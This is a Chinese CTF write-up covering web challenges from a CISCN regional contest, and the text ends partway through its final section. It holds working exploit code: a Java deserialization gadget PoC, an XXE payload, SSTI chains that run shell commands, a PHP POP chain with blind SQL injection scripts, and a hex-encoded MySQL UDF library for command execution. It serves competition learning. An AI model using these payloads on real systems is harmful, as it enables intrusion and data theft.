# ciscn国赛华东南分区赛WEB方向WriteUp分享

> 原文: https://www.ctfiot.com/125421.html
> ID: 125421

国赛华东南分区赛WriteUp分享

6月24日，由中央网信办网络安全协调局指导、教育部高等学校网络空间安全专业教学指导委员会主办、福州大学承办的第十六届全国大学生信息安全竞赛—创新实践能力赛华东南分区选拔赛圆满结束。

以下，为本次比赛WEB方向的解题思路分享：

目录

○ ezjava

○ ezphp

○ OnlineNotepad

○ funchallenge

○ Ciscn_Search_Engine

○ Ciscn_Book_Store_System

○ Bluebluesky

○ web-hack 题解

    ◇ websocket

    ◇ render

    ◇ exp

01

ezjava

代码审计

后台有两个功能，解压文件和下载文档

审计解压文件逻辑会发现

如果压缩包内有软链接，会创建软链接

再看下载文档

有判断是否包含./，无法跨目录下载flag，但如果把压缩文件传到/tmp/data下，然后通过解压操作，解压里面的软链接，这个软链接指向flag，即可获取flag

题目没有提供文件上传功能，但提供了一个反序列化，有依赖

aspect可写文件，UserBean调用任意object的put

正好可以对上aspect链后半段

Poc

package com.example.ctf;

import com.example.ctf.bean.UserBean;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
public class Test2 { public static void unserialize(byte[] bytes) throws Exception{ try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes); ObjectInputStream oin = new ObjectInputStream(bain)){ oin.readObject(); } }
 public static byte[] serialize(Object o) throws Exception{ try(ByteArrayOutputStream baout = new ByteArrayOutputStream(); ObjectOutputStream oout = new ObjectOutputStream(baout)){ oout.writeObject(o); return baout.toByteArray(); } } public static void setFieldValue(Object obj, String fieldname, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldname); field.setAccessible(true); field.set(obj,value); } public static void main(String[] args) throws Exception {
 Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap"); Constructor declaredConstructor = clazz.getDeclaredConstructor(String.class,int.class); declaredConstructor.setAccessible(true); HashMap map = (HashMap)declaredConstructor.newInstance("/tmp/data/", 123); String payload1 = readFileToString("/tmp/data/exp.tar"); UserBean ub = new UserBean("exp.tar",payload1); setFieldValue(ub, "obj", map); byte[] bytes = serialize(ub); byte[] payload = Base64.getEncoder().encode(bytes); System.out.println(new String(payload)); }

 public static String readFileToString(String fileName) { Path filePath = Paths.get(fileName); try { byte[] bytes = Files.readAllBytes(filePath); return new String(bytes, StandardCharsets.UTF_8); } catch (IOException e) { e.printStackTrace(); } return null; }}

postbase64=rO0ABXNyAB1jb20uZXhhbXBsZS5jdGYuYmVhbi5Vc2VyQmVhbpRg5pPhAcY4AgADT
AADYWdldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEbmFtZXEAfgABTAADb2JqdAASTGphdmEvbGFuZ
y9PYmplY3Q7eHB0C6RleHDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgDAwMDc1NSDAgDAwMDc2NSDAg
DAwMDAwMCDAgDAwMDAwMDAwMDAwIDE0NDMyMzUxMTM0IDAxMzAxNMCAIDIvZmxhZ8CAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIB1c3RhcsCAMDBmbXl5ecCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgHdoZWVswIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAMDAwMDAwIMCAMDAwMDAwIMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAg
MCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAdAAHZXhwLnRhcnNyAD5vcmcuYXNwZWN0ai53Z
WF2ZXIudG9vbHMuY2FjaGUuU2ltcGxlQ2FjaGUkU3RvcmVhYmxlQ2FjaGluZ01hcDurAh9LalZaA
gADSgAKbGFzdFN0b3JlZEkADHN0b3JpbmdUaW1lckwABmZvbGRlcnEAfgABeHIAEWphdmEudXRpb
C5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIA
AAAEAAAAAB4AAABiD1d8TUAAAB7dAAKL3RtcC9kYXRhLw==

Posttype=2&tarFilename=/tmp/data/exp.tar

02

ezphp

代码审计+变量覆盖+XXE

register.php 处存在变量覆盖

审计代码，发现注册用户的方式是将用户信息以xml的形式存储。

在登录处解析xml

存在xxe，例如利用变量覆盖写入

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///flag"> ]> &xxe; 123

/register.php?username=aaa&password=aaa&user_xml_format=%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%0a%20%20%20%20%20%20%20%20%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%22%3e%0a%20%20%20%20%20%20%20%20%5d%3e%0a%3c%75%73%65%72%69%6e%66%6f%3e%0a%3c%75%73%65%72%3e%0a%20%20%20%20%3c%75%73%65%72%6e%61%6d%65%3e%26%78%78%65%3b%3c%2f%75%73%65%72%6e%61%6d%65%3e%0a%20%20%20%20%3c%70%61%73%73%77%6f%72%64%3e%31%32%33%3c%2f%70%61%73%73%77%6f%72%64%3e%0a%3c%2f%75%73%65%72%3e%0a%3c%2f%75%73%65%72%69%6e%66%6f%3e

/login.php?username=aaa&password=wrong_password

03

OnlineNotepad

题目web框架为fastapi

fastapi有一个BaseModel类，类似于spring，传入json数据可以转化为类

观察源码

在 http://url/note

{ "username":"123", "note":"payload"}

import requests

def ssti(payload, username): burp0_url = "http://127.0.0.1:
21111/note/" burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
103.0) Gecko/20100101 Firefox/103.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"} burp0_json={"note": "{%endraw%}"+payload+"{%raw%}", "userid": username } a = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)def show(username): burp1_url = "http://127.0.0.1:
21111/note/"+username burp1_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
103.0) Gecko/20100101 Firefox/103.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"} b = requests.get(burp1_url, headers=burp1_headers) print(b.text)
ssti("{%print(d('cat /flag').read())%}","payl5")ssti("{%set d=c.os.popen%}{%include 'payl5.html'%}","payl4")ssti("{%set c=b.__globals__%}{%include 'payl4.html'%}","payl3")ssti("{%set b=a.__init__%}{%include 'payl3.html'%}","payl2")ssti("{%set a=joiner%}{%include 'payl2.html'%}", "payl1")show("payl1")

04

funchallenge

访问页面，发现是一个简单的小网站

点开 Share 按钮，提示我们使用本地地址去访问 controller/controller.php 文件

设置XFF头访问页面回显源码

<?phpshow_source(__FILE__);error_reporting(0);class MySQL{ public $conn = null; protected $config = array( "dsn" => "mysql:
host=localhost:
3306;dbname=?", "username" => "wow", "password" => "wow123" ); public function __construct(){ $this->conn = new PDO($this->config['dsn'], $this->config['username'], $this->config['password']); }}class Resume{ public $name; public $sql; public $stmt; public $id; public $data = array(); public $conn = null; public function __construct(){ $mysql = new MySQL(); $this->conn = $mysql->conn; } public function show(){ try { $sql = 'select * from articles;'; $stmt = $this->conn->prepare($sql); $stmt->execute(); while ($row = $stmt->fetch(PDO::
FETCH_BOTH)) { $this->data[] = $row; } $this->conn = null; return $this->data; } catch (Exception $e) { $this->conn = null; } } public function query($title){ try { $sql = " SELECT * FROM `articles` WHERE `title` LIKE :
name "; $stmt=$this->conn->prepare($sql); $stmt->bindValue(':
name', '%'.$title.'%', PDO::
PARAM_STR); $stmt->execute(); $row = $stmt->fetchAll(PDO::
FETCH_ASSOC); $this->conn = null; return $row; } catch (Exception $e) { $this->conn = null; } }}class AAA { public $name; public $sql; public $stmt; public $id; public $data = array(); public $conn = null; public function __construct(){ $mysql = new MySQL(); $this->conn = $mysql->conn; } public function query($title){ $sql = "SELECT * FROM `articles` WHERE `title` LIKE '%' '".$title."' '%';"; if (preg_match('/b(???)b/i',$title)) { die('hack!'); } $stmt = $this->conn->query($sql); $this->conn = null; }}class BBB{ protected $a; protected $func; public function __toString(){ $b = $this->a; return (string)$b(); }}class CCC{ public $a; public $b; public $c; public function __invoke(){ if(($this->a != $this->b) && (md5($this->a) == md5($this->b))){ $func = new AAA(); $func->query($this->c); } }}class DDD{ public $a; public function func($checksec){ if ($checksec == 0) { return 'NOPE'; } return 'OK'; } public function __set($name, $value){ $this->$name = $this->a; echo $this->a; }}
class EEE{ public $a; public $b; public function __call($name, $argc){ $this->b->func = $argc[0]; } public function calculate($arg1, $arg2){ $c = $arg1 + $arg2; return $c; } public function __wakeup(){ $this->a->helloworld = $this->b; }}unserialize($_POST['sql']);

EEE:
__wakeup()->DDD:
__set()->BBB:
__toString()->Nanahira:
__invoke()->AAA:
query()

<?phpshow_source(__FILE__);error_reporting(0);class AAA { public $name; public $sql; public $stmt; public $id; public $data = array(); public $conn = null;}class BBB{ public $a; public $func;}class CCC{ public $a; public $b; public $c;}class DDD{ public $a;}
class EEE{ public $a; public $b;}$a = new EEE();$b = new DDD();$b1 = new DDD();$c = new BBB();$a->a = $b;$b->a = $c;$d = new CCC();$c->a = $d;$c->func = $c1;$e = new AAA();$d->a = 'QLTHNDT';$d->b = 'EEIZDOI';// 查所有数据库$d->c = '1''%';select/**/if((ord(substr((select group_concat(distinct/**/table_schema)/**/from information_schema.columns),1,1))=114),sleep(3),1)#';// 查数据库里的表$d->c = '1''%';select/**/if((ord(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/as/**/test/**/where/**/table_schema=0x726573756d65),1,1))=97),sleep(3),1)#';// 查数据库里的字段$d->c = '1''%';select/**/if((ord(substr((select group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x61727469636c6573),1,1))=91),sleep(3),1)#';// 查数据库里的数据$d->c = '1''%';select/**/if((ord(substr((select/**/the_field_of_this_flag_is_not_very_long_ha_ha_ha_ha_ha_ha/**/from/**/ctftraining.flag/**/limit/**/3,4),1,1))=102),sleep(3),1)#';// echo urlencode(serialize($a));
echo urlencode(serialize($a));

import requests,time,os,datetime
def exp(ip, i, j): global length length = 0 req = requests.Session() url = ip + "/controller/controller.php" if (i < 10) and (j >= 10 and j <= 99): length = 167 elif (i < 10) and (j > 100 and j <= 127): length = 168 elif (i >= 10 and i <= 99) and (j >= 10 and j <= 99): length = 168 elif (i >= 10 and i <= 99) and (j >= 100 and j <= 127): length = 169 headers = { "X-Forwarded-For": "127.0.0.1" } payload = {"sql": "O:3:"EEE":2:{s:1:"a";O:3:"DDD":1:{s:1:"a";O:3:"BBB":2:{s:1:"a";O:3:"CCC":3:{s:1:"a";s:7:"QLTHNDT";s:1:"b";s:7:"EEIZDOI";s:1:"c";s:
168:"1''%';select/**/if((ord(substr((select/**/the_field_of_this_flag_is_not_very_long_ha_ha_ha_ha_ha_ha/**/from/**/ctftraining.flag/**/limit/**/3,4),"+str(i)+",1))="+str(j)+"),sleep(3),1)#";}s:4:"func";N;}}s:1:"b";N;}"} time1 = datetime.datetime.now() req = req.post(url, data=payload, headers=headers) time2 = datetime.datetime.now() sec = (time2 - time1).seconds if sec >= 2: return True else: return Falseflag = ""for i in range(1,127): for j in range(32,127): if(exp('http://192.168.233.1:
8081', i,j)): flag += chr(j) os.system("cls") print(flag)

import requests,time,os,datetime
def exp(ip, i, j): global length length = 0 req = requests.Session() url = ip + "/controller/controller.php" if (i < 10) and (j >= 10 and j <= 99): length = 142 elif (i < 10) and (j > 100 and j <= 127): length = 143 elif (i >= 10 and i <= 99) and (j >= 10 and j <= 99): length = 143 elif (i >= 10 and i <= 99) and (j >= 100 and j <= 127): length = 144 headers = { "X-Forwarded-For": "127.0.0.1" } payload = {"sql": "O:3:"EEE":2:{s:1:"a";O:3:"DDD":1:{s:1:"a";O:3:"BBB":2:{s:1:"a";O:3:"CCC":3:{s:1:"a";s:7:"QLTHNDT";s:1:"b";s:7:"EEIZDOI";s:1:"c";s:"+str(length)+":"1''%';select/**/if((ord(substr((select/**/group_concat(distinct/**/table_schema)/**/from/**/information_schema.columns),"+str(i)+",1))="+str(j)+"),sleep(3),1)#";}s:4:"func";N;}}s:1:"b";N;}"} time1 = datetime.datetime.now() req = req.post(url, data=payload, headers=headers) time2 = datetime.datetime.now() sec = (time2 - time1).seconds if sec >= 2: return True else: return Falseflag = ""for i in range(1,127): for j in range(32,127): if(exp('http://127.0.0.1:
8081', i,j)): flag += chr(j) os.system("cls") print(flag)

05

Ciscn_Search_Engine

Flask SSTI 漏洞，通过 fuzz 可以得知，过滤了如下内容：

['message', 'listdir', 'self','url_for','_','"',"os","read","cat","more", "`", "[", "]", "class", "config", "+", "eval", "exec", "join", "import", "popen", "system", "header", "arg", "form", "os", "read", "write", "flag", "ls", "ll", "sort", "nl", " ", ";", ":", "\"]

import requestsimport re
def regexp_out(data): patterns = [ re.compile(r'(flag{.*?})'), re.compile(r'xnuca{(.*?)}'), re.compile(r'DASCTF{(.*?)}'), re.compile(r'WMCTF{.*?}'), re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'), ]
 for pattern in patterns: res = pattern.findall(data.decode() if isinstance(data, bytes) else data) if len(res) > 0: return str(res[0])
 return None
def exp(): word = '''{{({}|attr(request.cookies.c)|attr(request.cookies.b)|attr(request.cookies.g)(0)|attr(request.cookies.s)()|attr(request.cookies.g)(59)|attr(request.cookies.fa)|attr(request.cookies.fb)|attr(request.cookies.ga)(request.cookies.fc)|attr(request.cookies.ga)(request.cookies.fd)(request.cookies.payload))}}'''
 data = { "word": word }
 headers = { "cookie": "c=__class__; b=__bases__; g=__getitem__; s=__subclasses__; ga= get; fa=__init__; fb=__globals__; fc=__builtins__; fd=eval; payload=__import__('os').popen('whoami').read()" }
 cookies = { "c": "__class__", "b": "__bases__", "g": "__getitem__", "s": "__subclasses__", "ga": "get", "fa":"__init__", "fb":"__globals__", "fc":"__builtins__", "fd":"eval", "payload": "__import__('os').popen('/readflag').read()" }
 r = requests.post(url, data={"word": word}, cookies=cookies)
 return regexp_out(r.text)
if __name__ == '__main__': print(exp())

06

Ciscn_Book_Store_System

题目存在 SQL 注入，没有过滤 select、union、sleep 等关键字，可以进行盲注，PoC 格式为

' union select 1,(case when (select ascii(substr(({0}),{1},1)))={2} then sleep(5) else '1' end),'

' union select 1,(select substr((select book from books limit 9,1),5,5)),replace(replace('" union select 1,(select substr((select book from books limit 9,1),5,5)),replace(replace(".",(select substr((select password from users limit 1,1),1,1)),(select substr((select password from users limit 1,1),60,1))),(select substr((select version()),2,1)),".") AS username-- ',(select substr((select password from users limit 1,1),1,1)),(select substr((select password from users limit 1,1),60,1))),(select substr((select version()),2,1)),'" union select 1,(select substr((select book from books limit 9,1),5,5)),replace(replace(".",(select substr((select password from users limit 1,1),1,1)),(select substr((select password from users limit 1,1),60,1))),(select substr((select version()),2,1)),".") AS username-- ') AS username--

1;SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000